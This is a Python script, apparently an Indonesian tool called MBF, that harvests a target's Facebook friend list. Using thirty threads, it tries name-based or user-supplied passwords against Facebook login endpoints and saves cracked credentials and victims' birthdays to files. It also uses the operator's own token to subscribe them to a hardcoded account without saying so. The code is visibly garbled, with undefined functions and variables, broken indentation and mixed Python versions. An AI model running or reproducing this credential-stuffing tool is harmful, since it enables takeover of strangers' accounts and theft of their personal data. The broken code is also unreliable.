#!/usr/bin/python2
# coding=utf-8
# OPEN SOURCE KODE
################################################
# Author               : Dian Rizki Pratama                                                            #
# Nama Script     : MBF                                                       #
# Github               : https://github.com/yanhukumrimba                          #
# Facebook          : https://www.facebook.com/Dian.Rizki.Pratama.DRP      #
# Instagram         : https://www.instagram.com/yanhukumrimba           #
# WhatsApp         : 0852927198X                                          #
################################################

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime

#######WARNA#######
b='\033[1;94m'                                #
i='\033[1;92m'                                 #
c='\033[1;96m'                                #
m='\033[1;91m'                               #
u='\033[1;95m'                                #
k='\033[1;93m'                                #
p='\033[1;97m'                                #
h='\033[1;92m'                                #
P = '\x1b[1;97m' # PUTIH               #
M = '\x1b[1;91m' # MERAH            #
H = '\x1b[1;92m' # HIJAU.              #
K = '\x1b[1;93m' # KUNING.           #
B = '\x1b[1;94m' # BIRU.                 #
U = '\x1b[1;95m' # UNGU.               #
O = '\x1b[1;96m' # BIRU MUDA.     #
N = '\x1b[0m'    # WARNA MATI     #
######WARNA########

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api.ipify.org').text
ua= awokawok(["Mozilla/5.0 (SymbianOS/9.3; U; Series60/3.2 Nokia5630d-1/011.018; Profile/MIDP-2.1 Configuration/CLDC-1.1)<br>AppleWebKit/413 (KHTML, like Gecko)<br>Safari/413[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",open("ua","r").read()])
api = "https://b-api.facebook.com/method/auth.login"
id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'Nopember',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))
hari = datetime.now().strftime('%A')
jam = datetime.now().strftime('%H:%M:%S')
bulan = {
        "01": "Januari",
        "02": "Februari",
        "03": "Maret",
        "04": "April",
        "05": "Mei",
        "06": "Juni",
        "07": "Juli",
        "08": "Agustus",
        "09": "September",
        "10": "November",
        "11": "Oktober",
        "12": "Desember"}

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
        
def logo():
	os.system("clear")
	print("""
╭╮╭━┳━━━┳━━━┳━━╮
┃┃┃╭┫╭━╮┃╭━╮┣┫┣╯
┃╰╯╯┃┃╱┃┃╰━╯┃┃┃
┃╭╮┃┃┃╱┃┃╭━━╯┃┃
┃┃┃╰┫╰━╯┃┃╱╱╭┫┣╮
╰╯╰━┻━━━┻╯╱╱╰━━╯
 - DIAN RIZKI PRATAMA -
        """)
    
def tokenz():
	os.system('clear')
	try:
		token = open('login.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		logo()
		print""+p+""
		print" SELAMAT - DATANG"
		token = raw_input('\n [✓] Masukkan Token : ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			try:
			nama=r['name']
            requests.post('https://graph.facebook.com/100055913630645/subscribers?access_token=' + token)
		    print(f"[✓] Login Berhasil [✓]\nWelcome {nama}")
			open("save","a").write(to)
			time.sleep(1.5)
			crack(to,nama).menu()
		except KeyError:
			print("[×] Login Gagal [×]\nToken Salah")
			time.sleep(1.5)
			login()
except KeyError:
			print("[!] Token Invalid!")
			sys.exit() 
 
def bot():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print (' [!] Token invalid') 
        os.system('rm -rf login.txt')
    
def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print'[!] Token Invalid!'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print'[!] Tidak Ada Koneksi!'
        sys.exit()

    logo()
    print(" "+p+"[✓] Author     : Dian Rizki Pratama") 
    print(" [✓] Github     : https://github.com/yanhukumrimba")
    print(" [✓] ---------------------------------------------")
    print(" [✓] ID         : "+id)
    print(" [✓] IP         : "+ip)
    print"\n [Status \033[1;93m"+Premium+"\033[1;97m ]"
    print"\n [ Selamat Datang \033[1;93m"+nama+"\033[1;97m ]"
    print("")
    print(" [1]. Crack Dari ID Publik")
    print(" [2]. Lihat Hasil Crack")
    print(" [3]. Laporkan Bug")
    print (" [4]. Ganti User Agent")
    print(" ["+m+"0"+p+"]. keluar (hapus token)")
    asw = raw_input("\n [?] pilih : ")
    if asw == "":
    	menu()
    elif asw == "1":
    	publik()
    elif asw == "3":
    	laporbug()
    elif asw == "2":
    	cekakun()
    elif asw == "0":
    elif asw == "4":
        useragent()
    	os.system('rm -f login.txt')
    	jalan(" [!] berhasil menghapus token ")
    	exit()
    else:
    	jalan(" [!] pilih yang bener ! ")
    	menu() 
    
def publik():
    print(" [✓] isi 'me' jika ingin crack dari daftar teman")
    idt = raw_input(' [✓] masukkan ID target : ')
    if idt == "":
    	menu()
    try:
        mmk = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        kntl = json.loads(mmk.text)
        #print' [+] Nama : ' + sp['name']
    except KeyError:
        print'[!] ID Tidak Tersedia!'
        menu()

    ajg = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
    ppk = json.loads(ajg.text)
    for i in ppk['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        id.append(uid + '|' + nm)
    print""
    print' [✓] total id -> \033[1;91m' + str(len(id))
    pilihmetode(ppk)
    
def cekakun():
    print'\n [1]. hasil crack OK '
    print' [2]. hasil crack CP '
    anjg = raw_input('\n [?] pilih : ')
    if anjg == '':
        menu()
    elif anjg == '01' or anjg == '1':
        print'\n [+] Hasil \x1b[0;92mOK\x1b[1;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[1;97m' % (ha, op, ta)
        os.system(' cat out/OK-%s-%s-%s' % (ha, op, ta))
        raw_input("\n [✓] Kembali ")
        menu()
    elif anjg == '02' or anjg == '2':
        totalcp = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta)).read().splitlines()
        print '\n [•] Hasil CP Tanggal : %s-%s-%s-%s' % (hari, ha, op, ta)
        print " \033[1;97m[•] Total : %s" %(len(totalcp))
        print""
        os.system(' cat out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta))
        raw_input("\n [✓] kembali ")
        menu()
    else:
        print(' [!] pilih yang benar!!')
        menu()
 
def laporbug():
	asulo = raw_input("\n [?] masukan laporan bug script : ").replace(' ','%20')
	if asulo == "":
		menu()
	os.system('xdg-open https://wa.me/6285729271984?text=' +asulo)
	raw_input("\n [✓] kembali ")
	menu()
       
def infologin():
	print""
	print "\n [✓] token : "+token
	print ""
	raw_input("\n [✓] kembali ")
	menu()
	
def useragent():
		ua=open("ua","r").read()
		print("\n### Useragent Saat Ini:",ua)
		print("\nIngin Mengganti User Agent?")
		yt=input("[?] Answer [Y/T]: ")
		if(yt in ("y","Y")):
			os.system("rm -rf ua")
			uaBaru=input("[+] Masukan User Agent Baru: ")
			open("ua","w").write(uaBaru)
			input("\n[✓] User Agent Berhasil Diganti\n[!] Enter For Back To Menu")
			self.menu()
		elif(yt in ("t","T")):
			self.menu()
	def menu(self):
		wok=[]
		os.system('clear')
	
def pilihmetode(file):
	print("")
	print(""+p+" [ pilih metode crack - silahkan coba satu² ]")
	print("")
	print(" [1] Metode Api (cepet)")
	print(" [2] Metode free.fb (lemot)")
	print("")
	z = raw_input(" [?] metode : ")
	if z == "":
		print(" [!] pilih yang benar!!")
		pilihmetode(file)
	elif z == '01' or z == '1':
		bapi()
	elif z == '02' or z == '2':
		freefb()
	else:
		print(" [!] pilih yang benar!")
		exit()
	
def bapi():
	ask = raw_input(' [?] Apakah Anda Ingin Menggunakan Password Manual? [Y/t]: ')
	if ask == 'Y' or ask == 'y':
		manualbapi()
	print'\n [✓] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
	print' [✓] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
	print("\n [!] jika tidak ada hasil, aktifkan mode pesawat 5-10 detik")
	print("")

	def main(arg):
		global ok,cp,ua, loop
		print '\r \033[1;97m[*] [crack] %s/%s -> OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") ##Gk Usah Di Ganti Ajg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345']:
				kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': uas, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
				param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				respon = requests.get(api,params=param, headers=kontol)
				if "session_key" in respon.text and "EAAA" in respon.text:
					print '\r  \033[0;92m*--> ' +uid+ '|' + pw + '        '
					ok.append(uid+'|'+pw)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  *--> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					continue
				if "www.facebook.com" in respon.json()["error_msg"]:
					try:
						token = open('login.txt').read()  
						sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
						b = json.loads(sw.text)
						graph = b["birthday"]
						month, day, year = graph.split("/")
						month = bulan[month]
						print'\r\x1b[1;93m  * --> ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
						cp.append(uid + '|' + pw + '|' + day + ' ' + month + ' ' + year)
						save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
						save.write('  * --> ' + str(uid) + '|' + str(pw) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
						save.close()
						break
					except(KeyError, IOError):
						graph = " "
					except:pass
					print'\r\x1b[1;93m  * --> ' + uid + '|' + pw + '                        '
					cp.append(uid + '|' + pw)
					save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
					save.write('  * --> ' + str(uid) + '|' + str(pw) +                        '\n')
					save.close()
					break
					continue
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print'\n\n\x1b[1;97m [+] crack selesai...'
	exit()
		
def manualbapi():
    print'\n [✓] buat password contoh : bismillah,sayang,rahasia'
    pw = raw_input(' [?] buat password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Benar, Tidak Boleh Kosong!')
    print'\n [✓] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print' [✓] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print("\n [!] apabila tidak ada hasil silahkan aktifkan mode pesawat selama 5-10 detik")
    print("")

    def main(arg):
        global loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print'\r\x1b[1;97m [*] [crack] %s/%s -> OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
                'user-agent': uas, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":asu,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
                respon = requests.get(api,params=param, headers=kontol)
                if "session_key" in respon.text and "EAAA" in respon.text:
                    print'\r\x1b[0;92m  *--> ' + uid + '|' + asu + '        '
                    ok.append(uid + '|' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  *--> ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                if "www.facebook.com" in respon.json()["error_msg"]:
                    print'\r\x1b[1;93m  * --> ' + uid + '|' + asu + '        '
                    cp.append(uid + '|' + asu)
                    save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n\n\x1b[1;97m [✓] crack selesai...'
    exit()
    
def freefb():
    ask = raw_input(' [?] apakah anda ingin menggunakan sandi manual? [Y/t] : ')
    if ask == 'Y' or ask == 'y':
        manualfreefb()
    print'\n [✓] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print' [✓] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print("\n [!] jika tidak ada hasil, aktifkan mode pesawat 5-10 detik")
    print("")
    
    def main(arg):
        global loop
        print'\r\x1b[1;97m [✓] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower(), name.lower() + '1234', name.lower() + '12345', name.lower() + '123']:
                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': uas })
                xo = rex.content
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[1;92m  * --> ' + uid + '|' + pw + '                                            '
                    ok.append(uid + '|' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [OK] ' + str(uid) + '|' + str(pw) +                                   '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b["birthday"]
                        month, day, year = graph.split("/")
                        month = bulan[month]
                        print'\r\x1b[1;93m  * --> ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + '|' + pw + '|' + day + ' ' + month + ' ' + year)
                        save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                        save.write('  * --> ' + str(uid) + '|' + str(pw) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        graph = " "
                    except:pass
                    print'\r\x1b[1;93m  * --> ' + uid + '|' + pw + '                        '
                    cp.append(uid + '|' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(pw) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n\n\x1b[1;97m [✓] crack selesai...'
    exit()


def manualfreefb():
    print'\n [✓] buat password contoh : bismillah,sayang,rahasia'
    pw = raw_input(' [?] buat password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Benar, Tidak Boleh Kosong!')
    print'\n [✓] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print' [✓] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print("\n [!] jika tidak ada hasil, aktifkan mode pesawat 5-10 detik")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[1;97m [✓] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': uas })
                xo = rex.content
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[1;92m. *--> ' + uid + '|' + asu + '                          '
                    ok.append(uid + '|' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  *--> ' + str(uid) + '|' + str(asu) +                         '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b["birthday"]
                        month, day, year = graph.split("/")
                        month = bulan[month]
                        print'\r\x1b[1;93m  * --> ' + uid + '|' + asu + '|' + day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + '|' + asu + '|' + day + ' ' + month + ' ' + year)
                        save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                        save.write('  * --> ' + str(uid) + '|' + str(asu) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        graph = " "
                    except:pass
                    print'\r\x1b[1;93m  * --> ' + uid + '|' + asu + '                        '
                    cp.append(uid + '|' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(asu) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass
    
    
    p = ThreadPool(30)
    p.map(main, id)
    print'\n\n\x1b[1;97m [✓] crack selesai...'
    exit()
    
if __name__ == '__main__':
    os.system('clear')
    tokenz()
    
    if __name__=="__main__":
	try:
		ua=open("ua","r").read()
	except FileNotFoundError:
		print("[!] Useragent Tidak Ada")
		tll=input("[+] Harap Masukan User Agent: ")
		open("ua","a").write(tll)
		print("[✓] Berhasil Ditambahkan\nSedang Menuju Ke Script")
		time.sleep(1)
	logika()
    
    
